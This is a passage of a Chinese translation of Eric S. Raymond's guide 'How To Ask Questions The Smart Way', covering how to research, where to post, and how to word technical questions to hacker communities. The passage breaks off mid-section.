href="#%E5%A6%82%E6%9E%9C%E8%BF%98%E6%98%AF%E6%90%9E%E4%B8%8D%E6%87%82">如果还是搞不懂</a></li><li><a href="#%E5%A4%84%E7%90%86%E6%97%A0%E7%A4%BC%E7%9A%84%E5%9B%9E%E5%BA%94">处理无礼的回应</a></li></ul></li><li><a href="#%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E6%89%AE%E6%BC%94%E5%A4%B1%E8%B4%A5%E8%80%85">如何避免扮演失败者</a></li><li><a href="#%E4%B8%8D%E8%AF%A5%E9%97%AE%E7%9A%84%E9%97%AE%E9%A2%98">不该问的问题</a></li><li><a href="#%E5%A5%BD%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A0%A2%E9%97%AE%E9%A2%98">好问题与蠢问题</a></li><li><a href="#%E5%A6%82%E6%9E%9C%E5%BE%97%E4%B8%8D%E5%88%B0%E5%9B%9E%E7%AD%94">如果得不到回答</a></li><li><a href="#%E5%A6%82%E4%BD%95%E6%9B%B4%E5%A5%BD%E5%9C%B0%E5%9B%9E%E7%AD%94%E9%97%AE%E9%A2%98">如何更好地回答问题</a></li><li><a href="#%E7%9B%B8%E5%85%B3%E8%B5%84%E6%BA%90">相关资源</a></li><li><a href="#%E9%B8%A3%E8%B0%A2">鸣谢</a></li></ul></li></ul><h2 id="声明">声明</h2><p>许多项目在他们网站的帮助文档中链接了本指南。这很好，这正是我们想要的用途。但如果你是该项目管理员并试图创建指向本指南的超链接，请在超链接附近的显著位置注明：</p><p><strong>本指南不提供此项目的实际支持服务！</strong></p><p>我们已经深刻领教到缺少上述声明所带来的痛苦：我们将不停地被那些认为发布这本指南就意味着有责任解决世上所有技术问题的傻瓜苦苦纠缠。</p><p>如果你因寻求某些帮助而阅读本指南，并在离开时还觉得可以从本文作者这里得到直接帮助，那你就是我们之前说的那些傻瓜之一。别问我们问题，我们只会忽略你。我们在这本指南中想教你如何从那些真正懂得你所遇到的软件或硬件问题的人处取得协助，而 99% 的情况下那不会是我们。除非你确定本指南的作者之一刚好是你所遇到的问题领域的专家，否则请不要打扰我们，这样大家都会开心一点。</p><h2 id="简介">简介</h2><p>在 <a href="http://www.catb.org/~esr/faqs/hacker-howto.html" rel="external nofollow noreferrer">黑客</a> 的世界里，当你拋出一个技术问题时，最终是否能得到有用的回答，往往取决于你所提问和追问的方式。本指南将教你如何正确地提问以获得你满意的答案。</p><p>现在开源（Open Source）软件已经相当盛行，您通常可以从其他更有经验的用户那里获得与黑客一样好的答案，这是件<strong>好事</strong>；和黑客相比，用户们往往对那些新手常遇到的问题更宽容一些。尽管如此，以我们在此推荐的方式对待这些有经验的用户通常也是从他们那里获得有用答案的最有效方式。</p><p>首先你应该明白，黑客们喜爱有挑战性的问题，或者能激发他们思维的好问题。如果我们并非如此，那我们也不会成为你想询问的对象。如果你给了我们一个值得反复咀嚼玩味的好问题，我们自会对你感激不尽。好问题是激励，是厚礼。好问题可以提高我们的理解力，而且通常会暴露我们以前从没意识到或者思考过的问题。对黑客而言，“好问题！”是诚挚的大力称赞。</p><p>尽管如此，黑客们有着蔑视或傲慢面对简单问题的坏名声，这有时让我们看起来对新手、无知者似乎较有敌意，但其实不是那样的。</p><p>我们不讳言我们对那些不愿思考、或者在发问前不做他们该做的事的人的蔑视。那些人是时间杀手 —— 他们只想索取，从不付出，消耗我们可用在更有趣的问题或更值得回答的人身上的时间。我们称这样的人为 <code>失败者（撸瑟）</code> （由于历史原因，我们有时把它拼作 <code>lusers</code>）。</p><p>我们意识到许多人只是想使用我们写的软件，他们对学习技术细节没有兴趣。对大多数人而言，电脑只是种工具，是种达到目的的手段而已。他们有自己的生活并且有更要紧的事要做。我们认可这点，也从不指望每个人都对这些让我们着迷的技术问题感兴趣。尽管如此，我们只为那些真正有兴趣并愿意积极参与问题解决的人调整回答问题的风格。这点不会变，也不该变：否则，我们就是在最擅长的事情上降低效率。</p><p>我们（在很大程度上）是自愿的，从繁忙的生活中抽出时间来解答疑惑，而且时常被提问淹没。所以我们无情地滤掉一些话题，特别是拋弃那些看起来像失败者的家伙，以便更高效地利用时间来回答<code>赢家（winner）</code>的问题。</p><p>如果你厌恶我们的态度，高高在上，或过于傲慢，不妨也设身处地想想。我们并没有要求你向我们屈服 —— 事实上，我们大多数人非常乐意与你平等地交流，只要你付出小小努力来满足基本要求，我们就会欢迎你加入我们的文化。但让我们帮助那些不愿意帮助自己的人是没有效率的。无知没有关系，但装白痴就是不行。</p><p>所以，你不必在技术上很在行才能吸引我们的注意，但你必须表现出能引导你变得在行的特质 —— 机敏、有想法、善于观察、乐于主动参与解决问题。如果你做不到这些使你与众不同的事情，我们建议你花点钱找家商业公司签个技术支持服务合同，而不是要求黑客个人无偿地帮助你。</p><p>如果你决定向我们求助，当然你也不希望被视为失败者，更不愿成为失败者中的一员。能立刻得到快速并有效答案的最好方法，就是像赢家那样提问 —— 聪明、自信、有解决问题的思路，只是偶尔在特定的问题上需要获得一点帮助。</p><p>（欢迎对本指南提出改进意见。你可以把你的建议发送至 <a href="esr@thyrsus.com">esr@thyrsus.com</a> 或 <a href="respond-auto@linuxmafia.com">respond-auto@linuxmafia.com</a>。然而请注意，本文并非 <a href="http://www.ietf.org/rfc/rfc1855.txt" rel="external nofollow noreferrer">网络礼节</a> 的通用指南，而我们通常会拒绝无助于在技术论坛得到有用答案的建议）。</p><h2 id="在提问之前">在提问之前</h2><p>在你准备要通过电子邮件、新闻群组或者聊天室提出技术问题前，请先做到以下事情：</p><ol><li>尝试在你准备提问的论坛的旧文章中搜索答案。</li><li>尝试上网搜索以找到答案。</li><li>尝试阅读手册以找到答案。</li><li>尝试阅读常见问题文件（FAQ）以找到答案。</li><li>尝试自己检查或试验以找到答案。</li><li>向你身边的强者朋友打听以找到答案。</li><li>如果你是程序开发者，请尝试阅读源代码以找到答案。</li></ol><p>当你提出问题的时候，请先表明你已经做了上述的努力；这将有助于树立你并不是一个不劳而获且浪费别人的时间的提问者。如果你能一并表达在做了上述努力的过程中所<strong>学到</strong>的东西会更好，因为我们更乐于回答那些表现出能从答案中学习的人的问题。</p><p>运用某些策略，比如先用 Google 搜索你所遇到的各种错误信息（搜索 <a href="http://groups.google.com/" rel="external nofollow noreferrer">Google 论坛</a> 和网页），这样很可能直接就找到了能解决问题的文件或邮件列表线索。即使没有结果，在邮件列表或新闻组寻求帮助时加上一句 <code>我在 Google 中搜过下列句子但没有找到什么有用的东西</code> 也是件好事，即使它只是表明了搜索引擎不能提供哪些帮助。这么做（加上搜索过的字串）也让遇到相似问题的其他人能被搜索引擎引导到你的提问来。</p><p>别着急，不要指望几秒钟的 Google 搜索就能解决一个复杂的问题。在向专家求助之前，再阅读一下常见问题文件（FAQ）、放轻松、坐得舒服一些，再花点时间思考一下这个问题。相信我们，他们能从你的提问看出你做了多少阅读与思考，如果你是有备而来，将更有可能得到解答。不要将所有问题一股脑拋出，只因你的第一次搜索没有找到答案（或者找到太多答案）。</p><p>准备好你的问题，再将问题仔细地思考过一遍，因为草率的发问只能得到草率的回答，或者根本得不到任何答案。越是能表现出在寻求帮助前你为解决问题所付出的努力，你越有可能得到实质性的帮助。</p><p>小心别问错了问题。如果你的问题基于错误的假设，某个普通黑客（J. Random Hacker）多半会一边在心里想着<code>蠢问题…</code>，一边用无意义的字面解释来答复你，希望着你会从问题的回答（而非你想得到的答案）中汲取教训。</p><p>绝不要自以为<strong>够格</strong>得到答案，你没有；你并没有。毕竟你没有为这种服务支付任何报酬。你将会是自己去<strong>挣到</strong>一个答案，靠提出有内涵的、有趣的、有思维激励作用的问题 —— 一个有潜力能贡献社区经验的问题，而不仅仅是被动地从他人处索取知识。</p><p>另一方面，表明你愿意在找答案的过程中做点什么是一个非常好的开端。<code>谁能给点提示？</code>、<code>我的这个例子里缺了什么？</code>以及<code>我应该检查什么地方</code>比<code>请把我需要的确切的过程贴出来</code>更容易得到答复。因为你表现出只要有人能指个正确方向，你就有完成它的能力和决心。</p><h2 id="当你提问时">当你提问时</h2><h3 id="慎选提问的论坛">慎选提问的论坛</h3><p>小心选择你要提问的场合。如果你做了下述的事情，你很可能被忽略掉或者被看作失败者：</p><ul><li>在与主题不合的论坛上贴出你的问题。</li><li>在探讨进阶技术问题的论坛张贴非常初级的问题；反之亦然。</li><li>在太多的不同新闻群组上重复转贴同样的问题（cross-post）。</li><li>向既非熟人也没有义务解决你问题的人发送私人电邮。</li></ul><p>黑客会剔除掉那些搞错场合的问题，以保护他们沟通的渠道不被无关的东西淹没。你不会想让这种事发生在自己身上的。</p><p>因此，第一步是找到对的论坛。再说一次，Google 和其它搜索引擎还是你的朋友，用它们来找到与你遭遇到困难的软硬件问题最相关的网站。通常那儿都有常见问题（FAQ）、邮件列表及相关说明文件的链接。如果你的努力（包括<strong>阅读</strong> FAQ）都没有结果，网站上也许还有报告 Bug（Bug-reporting）的流程或链接，如果是这样，链过去看看。</p><p>向陌生的人或论坛发送邮件最可能是风险最大的事情。举例来说，别假设一个提供丰富内容的网页的作者会想充当你的免费顾问。不要对你的问题是否会受到欢迎做太乐观的估计 —— 如果你不确定，那就向别处发送，或者压根别发。</p><p>在选择论坛、新闻群组或邮件列表时，别太相信它的名字，先看看 FAQ 或者许可书以弄清楚你的问题是否切题。发文前先翻翻已有的话题，这样可以让你感受一下那里的文化。事实上，事先在新闻组或邮件列表的历史记录中搜索与你问题相关的关键词是个极好的主意，也许这样就找到答案了。即使没有，也能帮助你归纳出更好的问题。</p><p>别像机关枪似的一次“扫射”所有的帮助渠道，这就像大喊大叫一样会使人不快。要一个一个地来。</p><p>搞清楚你的主题！最典型的错误之一是在某种致力于跨平台可移植的语言、套件或工具的论坛中提关于 Unix 或 Windows 操作系统程序界面的问题。如果你不明白为什么这是大错，最好在搞清楚这之间差异之前什么也别问。</p><p>一般来说，在仔细挑选的公共论坛中提问，会比在私有论坛中提同样的问题更容易得到有用的回答。有几个理由可以支持这点，一是看潜在的回复者有多少，二是看观众有多少。黑客较愿意回答那些能帮助到许多人的问题。</p><p>可以理解的是，老练的黑客和一些热门软件的作者正在接受过多的错发信息。就像那根最后压垮骆驼背的稻草一样，你的加入也有可能使情况走向极端 —— 已经好几次了，一些热门软件的作者由于涌入其私人邮箱的大量不堪忍受的无用邮件而不再提供支持。</p><h3 id="Stack-Overflow">Stack Overflow</h3><p>搜索，<em>然后</em>在 Stack Exchange 问。</p><p>近年来，Stack Exchange 社区已经成为回答技术及其他问题的主要渠道，尤其是那些开放源码的项目。</p><p>因为 Google 索引是即时的，在看 Stack Exchange 之前先在 Google 搜索。有很高的几率某人已经问了一个类似的问题，而且 Stack Exchange 网站们往往会是搜索结果中最前面几个。如果你在 Google 上没有找到任何答案，你再到特定相关主题的网站去找。用标签（Tag）搜索能让你更缩小你的搜索结果。</p><p>如果你还是找不到任何对你的问题有用的内容，请把你的问题发在与它最相关的网站上。提问的时候请善用格式化工具，尤其注意为代码添加格式，并且添加相关的标签（特别是编程语言、操作系统或库/包的名称）。当有人要求你提供更多相关信息时，请编辑你的贴子来补充它们 [译注：而不是发一个回帖或回答！]。如果你觉得一个答案对你有帮助，点击向上的箭头来为它投票；如果一个答案提供了问题的正确解决方案，点击投票按钮下方的对勾来将它标记为正解。</p><p>Stack Exchange 已经成长到 <a href="https://stackexchange.com/sites" rel="external nofollow noreferrer">超过一百个网站</a>，以下是最常用的几个站：</p><ul><li>Super User 是问一些通用的电脑问题，如果你的问题跟代码或是写程序无关，只是一些网络连线之类的，请到这里。</li><li>Stack Overflow 是问写程序有关的问题。</li><li>Server Fault 是问服务器和网管相关的问题。</li></ul><h3 id="网站和-IRC-论坛">网站和 IRC 论坛</h3><p>本地的用户群组（user group），或者你所用的 Linux 发行版本也许正在宣传他们的网页论坛或 IRC 频道，并提供新手帮助（在一些非英语国家，新手论坛很可能还是邮件列表），这些都是开始提问的好地方，特别是当你觉得遇到的也许只是相对简单或者很普通的问题时。有广告赞助的 IRC 频道是公开欢迎提问的地方，通常可以即时得到回应。</p><p>事实上，如果程序出的问题只发生在特定 Linux 发行版提供的版本（这很常见），最好先去该发行版的论坛或邮件列表中提问，再到程序本身的论坛或邮件列表提问。（否则）该项目的黑客可能仅仅回复“使用<strong>我们的</strong>版本”。</p><p>在任何论坛发文以前，先确认一下有没有搜索功能。如果有，就试着搜索一下问题的几个关键词，也许这会有帮助。如果在此之前你已做过通用的网页搜索（你也该这样做），还是再搜索一下论坛，搜索引擎有可能没来得及索引此论坛的全部内容。</p><p>通过论坛或 IRC 频道来提供用户支持服务有增长的趋势，电子邮件则大多为项目开发者间的交流而保留。所以最好先在论坛或 IRC 中寻求与该项目相关的协助。</p><p>在使用 IRC 的时候，首先最好不要发布很长的问题描述，有些人称之为频道洪水。最好通过一句话的问题描述来开始聊天。</p><h3 id="第二步，使用项目邮件列表">第二步，使用项目邮件列表</h3><p>当某个项目提供开发者邮件列表时，要向列表而不是其中的个别成员提问，即使你确信他能最好地回答你的问题。查一查项目的文件和首页，找到项目的邮件列表并使用它。有几个很好的理由支持我们采用这种办法：</p><ul><li>任何好到需要向个别开发者提出的问题，也将对整个项目群组有益。反之，如果你认为自己的问题对整个项目群组来说太愚蠢，那这也不能成为骚扰个别开发者的理由。</li><li>向列表提问可以分散开发者的负担，个别开发者（尤其是项目领导人）也许太忙以至于没法回答你的问题。</li><li>大多数邮件列表都会被存档，那些被存档的内容将被搜索引擎索引。如果你向列表提问并得到解答，将来其他人可以通过网页搜索找到你的问题和答案，也就不用再次发问了。</li><li>如果某些问题经常被问到，开发者可以利用此信息来改进说明文件或软件本身，以使其更清楚。如果只是私下提问，就没有人能看到最常见问题的完整场景。</li></ul><p>如果一个项目既有“用户”也有“开发者”（或“黑客”）邮件列表或论坛，而你又不会动到那些源代码，那么就向“用户”列表或论坛提问。不要假设自己会在开发者列表中受到欢迎，那些人多半会将你的提问视为干扰他们开发的噪音。</p><p>然而，如果你<strong>确信</strong>你的问题很特别，而且在“用户”列表或论坛中几天都没有回复，可以试试前往“开发者”列表或论坛发问。建议你在张贴前最好先暗地里观察几天以了解那里的行事方式（事实上这是参与任何私有或半私有列表的好主意）</p><p>如果你找不到一个项目的邮件列表，而只能查到项目维护者的电子邮件地址，尽管向他发信。即使是在这种情况下，也别假设（项目）邮件列表不存在。在你的电子邮件中，请陈述你已经试过但没有找到合适的邮件列表，也提及你不反对将自己的邮件转发给他人（许多人认为，即使没什么秘密，私人电子邮件也不应该被公开。通过允许将你的电子邮件转发他人，你给了相应人员处置你邮件的选择）。</p><h3 id="使用有意义且描述明确的标题">使用有意义且描述明确的标题</h3><p>在邮件列表、新闻群组或论坛中，大约 50 字以内的标题是抓住资深专家注意力的好机会。别用喋喋不休的<code>帮帮忙</code>、<code>跪求</code>、<code>急</code>（更别说<code>救命啊！！！！</code>这样让人反感的话，用这种标题会被条件反射式地忽略）来浪费这个机会。不要妄想用你的痛苦程度来打动我们，而应该是在这点空间中使用极简单扼要的描述方式来提出问题。</p><p>一个好标题范例是<code>目标 —— 差异</code>式的描述，许多技术支持组织就是这样做的。在<code>目标</code>部分指出是哪一个或哪一组东西有问题，在<code>差异</code>部分则描述与期望的行为不一致的地方。</p><blockquote><p>蠢问题：救命啊！我的笔记本电脑不能正常显示了！</p></blockquote><blockquote><p>聪明问题：<a href="http://X.org" rel="external nofollow noreferrer">X.org</a> 6.8.1 的鼠标指针会变形，某牌显卡 MV1005 芯片组。</p></blockquote><blockquote><p>更聪明问题：<a href="http://X.org" rel="external nofollow noreferrer">X.org</a> 6.8.1 的鼠标指针，在某牌显卡 MV1005 芯片组环境下 - 会变形。</p></blockquote><p>编写<code>目标 —— 差异</code> 式描述的过程有助于你组织对问题的细致思考。是什么被影响了？ 仅仅是鼠标指针或者还有其它图形？只在 <a href="http://X.org" rel="external nofollow noreferrer">X.org</a> 的 X 版中出现？或只是出现在 6.8.1 版中？ 是针对某牌显卡芯片组？或者只是其中的 MV1005 型号？ 一个黑客只需瞄一眼就能够立即明白你的环境<strong>和</strong>你遇到的问题。</p><p>总而言之，请想像一下你正在一个只显示标题的存档讨论串（Thread）索引中查寻。让你的标题更好地反映问题，可使下一个搜索类似问题的人能够关注这个讨论串，而不用再次提问相同的问题。</p><p>如果你想在回复中提出问题，记得要修改内容标题，以表明你是在问一个问题， 一个看起来像 <code>Re: 测试</code> 或者 <code>Re: 新 bug</code> 的标题很难引起足够重视。另外，在不影响连贯性之下，适当引用并删减前文的内容，能给新来的读者留下线索。</p><p>对于讨论串，不要直接点击回复来开始一个全新的讨论串，这将限制你的观众。因为有些邮件阅读程序，比如 mutt ，允许用户按讨论串排序并通过折叠讨论串来隐藏消息，这样做的人永远看不到你发的消息。</p><p>仅仅改变标题还不够。mutt 和其它一些邮件阅读程序还会检查邮件标题以外的其它信息，以便为其指定讨论串。所以宁可发一个全新的邮件。</p><p>在网页论坛上，好的提问方式稍有不同，因为讨论串与特定的信息紧密结合，并且通常在讨论串外就看不到里面的内容，故通过回复提问，而非改变标题是可接受的。不是所有论坛都允许在回复中出现分离的标题，而且这样做了基本上没有人会去看。不过，通过回复提问，这本身就是暧昧的做法，因为它们只会被正在查看该标题的人读到。所以，除非你<strong>只想</strong>在该讨论串当前活跃的人群中提问，不然还是另起炉灶比较好。</p><h3 id="使问题容易回复">使问题容易回复</h3><p>以<code>请将你的回复发送到……</code>来结束你的问题多半会使你得不到回答。如果你觉得花几秒钟在邮件客户端设置一下回复地址都麻烦，我们也觉得花几秒钟思考你的问题更麻烦。如果你的邮件程序不支持这样做，<a href="http://linuxmafia.com/faq/Mail/muas.html" rel="external nofollow noreferrer">换个好点的</a>；如果是操作系统不支持这种邮件程序，也换个好点的。</p><p>在论坛，要求通过电子邮件回复是非常无礼的，除非你认为回复的信息可能比较敏感（有人会为了某些未知的原因，只让你而不是整个论坛知道答案）。如果你只是想在有人回复讨论串时得到电子邮件提醒，可以要求网页论坛发送给你。几乎所有论坛都支持诸如<code>追踪此讨论串</code>、<code>有回复时发送邮件提醒</code>等功能。</p><h3 id="a-name-使用清晰、正确、精准且合乎语法的语句-使用清晰、正确、精准且合乎语法的语句-a"><a name="使用清晰、正确、精准且合乎语法的语句">使用清晰、正确、精准且合乎语法的语句</a></h3><p>我们从经验中发现，粗心的提问者通常也会粗心地写程序与思考（我敢打包票）。回答粗心大意者的问题很不值得，我们宁愿把时间耗在别处。</p><p>正确的拼写、标点符号和大小写是很重要的。一般来说，如果你觉得这样做很麻烦，不想在乎这些，那我们也觉得麻烦，不想在乎你的提问。花点额外的精力斟酌一下字句，用不着太僵硬与正式 —— 事实上，黑客文化很看重能准确地使用非正式、俚语和幽默的语句。但它<strong>必须很</strong>准确，而且有迹象表明你是在思考和关注问题。</p><p>正确地拼写、使用标点和大小写，不要将<code>its</code>混淆为<code>it's</code>，<code>loose</code>搞成<code>lose</code>或者将<code>discrete</code>弄成<code>discreet</code>。不要<strong>全部用大写</strong>，这会被视为无礼的大声嚷嚷（全部小写也好不到哪去，因为不易阅读。<a href="http://en.wikipedia.org/wiki/Alan_Cox" rel="external nofollow noreferrer">Alan Cox</a> 也许可以这样做，但你不行）。</p><p>更白话的说，如果你写得像是个半文盲 [译注：[小白](<a href="http://zh.wikipedia.org/wiki/%E5%B0%8F%E7%99%BD%EF%BC%89" rel="external nofollow noreferrer">http://zh.wikipedia.org/wiki/小白）</a>]，那多半得不到理睬。也不要使用即时通信中的简写或 <a href="http://zh.wikipedia.org/wiki/%E7%81%AB%E6%98%9F%E6%96%87%EF%BC%89%EF%BC%8C%E5%A6%82%E5%B0%86%60%E7%9A%84%60%E7%AE%80%E5%8C%96%E4%B8%BA%60d%60%E4%BC%9A%E4%BD%BF%E4%BD%A0%E7%9C%8B%E8%B5%B7%E6%9D%A5%E5%83%8F%E4%B8%80%E4%B8%AA%E4%B8%BA%E4%BA%86%E5%B0%91%E6%89%93%E5%87%A0%E4%B8%AA%E9%94%AE%E8%80%8C%E7%9C%81%E5%AD%97%E7%9A%84%E5%B0%8F%E7%99%BD%E3%80%82%E6%9B%B4%E7%B3%9F%E7%9A%84%E6%98%AF%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%83%8F%E4%B8%AA%E5%B0%8F%E5%AD%A9%E4%BC%BC%E5%9C%B0%E9%AC%BC%E7%94%BB%E7%AC%A6%E9%82%A3%E7%BB%9D%E5%AF%B9%E6%98%AF%E5%9C%A8%E6%89%BE%E6%AD%BB%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%82%AF%E5%AE%9A%E6%B2%A1%E4%BA%BA%E4%BC%9A%E7%90%86%E4%BD%A0%EF%BC%88%E6%88%96%E8%80%85%E6%9C%80%E5%A4%9A%E6%98%AF%E7%BB%99%E4%BD%A0%E4%B8%80%E5%A4%A7%E5%A0%86%E6%8C%87%E8%B4%A3%E4%B8%8E%E6%8C%96%E8%8B%A6" rel="external nofollow noreferrer">火星文</a>。</p><p>如果在使用非母语的论坛提问，你可以犯点拼写和语法上的小错，但决不能在思考上马虎（没错，我们通常能弄清两者的分别）。同时，除非你知道回复者使用的语言，否则请使用英语书写。繁忙的黑客一般会直接删除用他们看不懂的语言写的消息。在网络上英语是通用语言，用英语书写可以将你的问题在尚未被阅读就被直接删除的可能性降到最低。</p><p>如果英文是你的外语（Second language），提示潜在回复者你有潜在的语言困难是很好的：<br>[译注：以下附上原文以供使用]</p><blockquote><p>English is not my native language; please excuse typing errors.</p></blockquote><ul><li>英文不是我的母语，请原谅我的错字或语法。</li></ul><blockquote><p>If you speak $LANGUAGE, please email/PM me;<br>I may need assistance translating my question.</p></blockquote><ul><li>如果你说<strong>某语言</strong>，请向我发电邮/私信；</li><li>我需要有人协助我翻译我的问题。</li></ul><blockquote><p>I am familiar with the technical terms,<br>but some slang expressions and idioms are difficult for me.</p></blockquote><ul><li>我对技术名词很熟悉，但对于俗语或是特别用法不甚了解。</li></ul><blockquote><p>I’ve posted my question in $LANGUAGE and English.<br>I’ll be glad to translate responses, if you only use one or the other.</p></blockquote><ul><li>我把我的问题用<strong>某语言</strong>和英文写出来。</li><li>如果你只用其中的一种语言回答，我会乐意将回复翻译成为你使用的语言。</li></ul><h3 id="使用易于读取且标准的文件格式发送问题">使用易于读取且标准的文件格式发送问题</h3><p>如果你人为地将问题搞得难以阅读，它多半会被忽略，人们更愿读易懂的问题，所以：</p><ul><li>使用纯文字而不是 HTML (<a href="http://archive.birdhouse.org/etc/evilmail.html" rel="external nofollow noreferrer">关闭 HTML</a> 并不难）。</li><li>使用 MIME 附件通常是可以的，前提是真正有内容（譬如附带的源代码或 patch），而不仅仅是邮件程序生成的模板（譬如只是信件内容的拷贝）。</li><li>不要发送一段文字只是一行句子但自动换行后会变成多行的邮件（这使得回复部分内容非常困难）。设想你的读者是在 80 个字符宽的终端机上阅读邮件，最好设置你的换行分割点小于 80 字。</li><li>但是，对一些特殊的文件<strong>不要</strong>设置固定宽度（譬如日志文件拷贝或会话记录）。数据应该原样包含，让回复者有信心他们看到的是和你看到的一样的东西。</li><li>在英语论坛中，不要使用<code>Quoted-Printable</code> MIME 编码发送消息。这种编码对于张贴非 ASCII 语言可能是必须的，但很多邮件程序并不支持这种编码。当它们处理换行时，那些文本中四处散布的<code>=20</code>符号既难看也分散注意力，甚至有可能破坏内容的语意。</li><li>绝对，<strong>永远</strong>不要指望黑客们阅读使用封闭格式编写的文档，像微软公司的 Word 或 Excel 文件等。大多数黑客对此的反应就像有人将还在冒热气的猪粪倒在你家门口时你的反应一样。即便他们能够处理，他们也很厌恶这么做。</li><li>如果你从使用 Windows 的电脑发送电子邮件，关闭微软愚蠢的<code>智能引号</code>功能 （从 [选项] &gt; [校订] &gt; [自动校正选项]，勾选掉<code>智能引号</code>单选框），以免在你的邮件中到处散布垃圾字符。</li><li>在论坛，勿滥用<code>表情符号</code>和<code>HTML</code>功能（当它们提供时）。一两个表情符号通常没有问题，但花哨的彩色文本倾向于使人认为你是个无能之辈。过滥地使用表情符号、色彩和字体会使你看来像个傻笑的小姑娘。这通常不是个好主意，除非你只是对性而不是对答案感兴趣。</li></ul><p>如果你使用图形用户界面的邮件程序（如微软公司的 Outlook 或者其它类似的），注意它们的默认设置不一定满足这些要求。大多数这类程序有基于选单的<code>查看源代码</code>命令，用它来检查发送文件夹中的邮件，以确保发送的是纯文本文件同时没有一些奇怪的字符。</p><h3 id="精确地描述问题并言之有物">精确地描述问题并言之有物</h3><ul><li>仔细、清楚地描述你的问题或 Bug 的症状。</li><li>描述问题发生的环境（机器配置、操作系统、应用程序、以及相关的信息），提供经销商的发行版和版本号（如：<code>Fedora Core 4</code>、<code>Slackware 9.1</code>等）。</li><li>描述在提问前你是怎样去研究和理解这个问题的。</li><li>描述在提问前为确定问题而采取的诊断步骤。</li><li>描述最近做过什么可能相关的硬件或软件变更。</li><li>尽可能地提供一个可以<code>重现这个问题的可控环境</code>的方法。</li></ul><p>尽量去揣测一个黑客会怎样反问你，在你提问之前预先将黑客们可能提出的问题回答一遍。</p><p>以上几点中，当你报告的是你认为可能在代码中的问题时，给黑客一个可以重现你的问题的环境尤其重要。当你这么做时，你得到有效的回答的机会和速度都会大大的提升。</p><p><a href="http://www.chiark.greenend.org.uk/~sgtatham/" rel="external nofollow noreferrer">Simon Tatham</a> 写过一篇名为《<a href="http://www.chiark.greenend.org.uk/~sgtatham/bugs-cn.html" rel="external nofollow noreferrer">如何有效地报告 Bug</a>》的出色文章。强力推荐你也读一读。</p><h3 id="话不在多而在精">话不在多而在精</h3><p>你需要提供精确有内容的信息。这并不是要求你简单的把成堆的出错代码或者资料完全转录到你的提问中。如果你有庞大而复杂的测试样例能重现程序挂掉的情境，尽量将它剪裁得越小越好。</p><p>这样做的用处至少有三点。<br>第一，表现出你为简化问题付出了努力，这可以使你得到回答的机会增加；<br>第二，简化问题使你更有可能得到<strong>有用</strong>的答案；<br>第三，在精炼你的 bug 报告的过程中，你很可能就自己找到了解决方法或权宜之计。</p><h3 id="别动辄声称找到-Bug">别动辄声称找到 Bug</h3><p>当你在使用软件中遇到问题，除非你非常、<strong>非常</strong>的有根据，不要动辄声称找到了 Bug。提示：除非你能提供解决问题的源代码补丁，或者提供回归测试来表明前一版本中行为不正确，否则你都多半不够完全确信。这同样适用在网页和文件，如果你（声称）发现了文件的<code>Bug</code>，你应该能提供相应位置的修正或替代文件。</p><p>请记得，还有其他许多用户没遇到你发现的问题，否则你在阅读文件或搜索网页时就应该发现了（你在抱怨前 <a href="#%E5%9C%A8%E6%8F%90%E9%97%AE%E4%B9%8B%E5%89%8D%EF%BC%89%EF%BC%9F">已经做了这些，是吧</a>。这也意味着很有可能是你弄错了而不是软件本身有问题。</p><p>编写软件的人总是非常辛苦地使它尽可能完美。如果你声称找到了 Bug，也就是在质疑他们的能力，即使你是对的，也有可能会冒犯到其中某部分人。当你在标题中嚷嚷着有<code>Bug</code>时，这尤其严重。</p><p>提问时，即使你私下非常确信已经发现一个真正的 Bug，最好写得像是<strong>你</strong>做错了什么。如果真的有 Bug，你会在回复中看到这点。这样做的话，如果真有 Bug，维护者就会向你道歉，这总比你惹恼别人然后欠别人一个道歉要好一点。</p><h3 id="低声下气不能代替你的功课">低声下气不能代替你的功课</h3><p>有些人明白他们不该粗鲁或傲慢的提问并要求得到答复，但他们选择另一个极端 —— 低声下气：<code>我知道我只是个可悲的新手，一个撸瑟，但。..</code>。这既使人困扰，也没有用，尤其是伴随着与实际问题含糊不清的描述时更令人反感。</p><p>别用原始灵长类动物的把戏来浪费你我的时间。取而代之的是，尽可能清楚地描述背景条件和你的问题情况。这比低声下气更好地定位了你的位置。</p><p>有时网页论坛会设有专为新手提问的版面，如果你真的认为遇到了初学者的问题，到那去就是了，但一样别那么低声下气。</p><h3 id="描述问题症状而非你的猜测">描述问题症状而非你的猜测</h3><p>告诉黑客们你认为问题是怎样造成的并没什么帮助。（如果你的推断如此有效，还用向别人求助吗？），因此要确信你原原本本告诉了他们问题的症状，而不是你的解释和理论；让黑客们来推测和诊断。如果你认为陈述自己的猜测很重要，清楚地说明这只是你的猜测，并描述为什么它们不起作用。</p><p><strong>蠢问题</strong></p><blockquote><p>我在编译内核时接连遇到 SIG11 错误，<br>我怀疑某条飞线搭在主板的走线上了，这种情况应该怎样检查最好？</p></blockquote><p><strong>聪明问题</strong></p><blockquote><p>我的组装电脑是 FIC-PA2007 主机板搭载 AMD K6/233 CPU（威盛 Apollo VP2 芯片组），<br>256MB Corsair PC133 SDRAM 内存，在编译内核时，从开机 20 分钟以后就频频产生 SIG11 错误，<br>但是在头 20 分钟内从没发生过相同的问题。重新启动也没有用，但是关机一晚上就又能工作 20 分钟。<br>所有内存都换过了，没有效果。相关部分的标准编译记录如下…</p></blockquote><p>由于以上这点似乎让许多人觉得难以配合，这里有句话可以提醒你：<code>所有的诊断专家都来自密苏里州。</code> 美国国务院的官方座右铭则是：<code>让我看看</code>（出自国会议员 Willard D. Vandiver 在 1899 年时的讲话：<code>我来自一个出产玉米，棉花，牛蒡和民主党人的国家，滔滔雄辩既不能说服我，也不会让我满意。我来自密苏里州，你必须让我看看。</code>） 针对诊断者而言，这并不是一种怀疑，而只是一种真实而有用的需求，以便让他们看到的是与你看到的原始证据尽可能一致的东西，而不是你的猜测与归纳的结论。所以，大方地展示给我们看吧！</p><h3 id="按发生时间先后列出问题症状">按发生时间先后列出问题症状</h3><p>问题发生前的一系列操作，往往就是对找出问题最有帮助的线索。因此，你的说明里应该包含你的操作步骤，以及机器和软件的反应，直到问题发生。在命令行处理的情况下，提供一段操作记录（例如运行脚本工具所生成的），并引用相关的若干行（如 20 行）记录会非常有帮助。</p><p>如果挂掉的程序有诊断选项（如 -v 